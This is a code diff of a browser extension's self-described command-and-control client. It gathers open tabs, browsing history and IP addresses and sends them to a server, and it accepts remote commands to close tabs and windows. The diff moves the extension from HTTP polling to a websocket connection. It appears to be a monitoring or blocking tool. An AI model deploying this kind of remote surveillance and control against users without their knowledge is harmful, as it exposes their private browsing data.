@@ -1,27 +1,13 @@
-/* C&C client API */
-
+/* C&C Client API */
 // Update info whenever tabs are opened, modified, or closed
-chrome.tabs.onCreated.addListener(updateInfo);
-chrome.tabs.onUpdated.addListener(updateInfo);
-chrome.tabs.onRemoved.addListener(updateInfo);
+chrome.tabs.onCreated.addListener(update);
+chrome.tabs.onUpdated.addListener(update);
+chrome.tabs.onRemoved.addListener(update);
 
-var completedCommands = []
-
-// Command structure definition
-var runCommand = {
-    closeTab: closeTab,
-    closeActiveTab: closeActiveTab,
-    closeAllTabs: closeAllTabs,
-    closeActiveWindow: closeActiveWindow
-}
-
-function updateInfo() {
-    if (awake) {
-        var getId = new Promise(function (resolve, reject) {
-            chrome.storage.local.get(['id'], function (result) {
-                resolve(result.id);
-            });
-        });
+/* Outgoing protocol definition */
+// Gather and update all information
+function update() {
+    if (isAlive) {
         var getTabs = new Promise(function (resolve, reject) {
             chrome.tabs.query({}, function (tabs) {
                 resolve(tabs);
@@ -38,31 +24,29 @@ function updateInfo() {
             });
         });
     
-        Promise.all([getId, getTabs, getHistory, getIPs])
+        Promise.all([getTabs, getHistory, getIPs])
         .then(function (data) {
-            $.post(`${url}/clients/${data[0]}/update`, {
-                data: JSON.stringify({
-                    blocks: successfulBlocks,
-                    tabs: data[1],
-                    history: data[2],
-                    ips: data[3]
-                })
+            wsc.do('update', {
+                successfulBlocks: successfulBlocks,
+                tabs: data[0],
+                history: data[1],
+                ips: data[2]
             })
-            .fail(fellOver);
         });
     }
 }
 
-async function closeTab(args) {
+/* Incoming protocol handlers */
+wsc.on('closeTab', function (args) {
     chrome.tabs.remove(args.tabId, function () {
         if (chrome.runtime.lastError) {
             return 'Unable to close tab';
         }
         return;
     });
-}
+});
 
-async function closeActiveTab() {
+wsc.on('closeActiveTab', function () {
     chrome.tabs.query({ active: true }, function (tabs) {
         chrome.tabs.remove(tabs.map(tab => tab.id), function() {
             if (chrome.runtime.lastError) {
@@ -71,9 +55,9 @@ async function closeActiveTab() {
             return;
         })
     })
-}
+});
 
-async function closeAllTabs() {
+wsc.on('closeAllTabs', function () {
     chrome.tabs.query({}, function (tabs) {
         chrome.tabs.remove(tabs.map(tab => tab.id), function () {
             if (chrome.runtime.lastError) {
@@ -82,9 +66,9 @@ async function closeAllTabs() {
             return;
         });
     });
-}
+});
 
-async function closeActiveWindow() {
+wsc.on('closeActiveWindow', function () {
     chrome.windows.getLastFocused(function (window) {
         chrome.windows.remove(window.id, function() {
             if (chrome.runtime.lastError) {
@@ -93,26 +77,4 @@ async function closeActiveWindow() {
             return;
         });
     });
-}
-
-async function consumeCommands() {
-    if (awake) {
-        chrome.storage.local.get(['id'], function (result) {
-            $.getJSON(`${url}/clients/${result.id}/bulletin`, async function (commands) {
-                for (var i = 0; i < commands.length; i++) {
-                    if (!completedCommands.includes(commands[i].id)) {
-                        await runCommand[commands[i].code](commands[i].args)
-                        .then(function (err) {
-                            if (!err) {
-                                completedCommands.push(commands[i].id)
-                            }
-                        });
-                    }
-                }
-            })
-            .fail(fellOver);
-        });
-    }
-}
-
-setInterval(consumeCommands, 1500)
+});
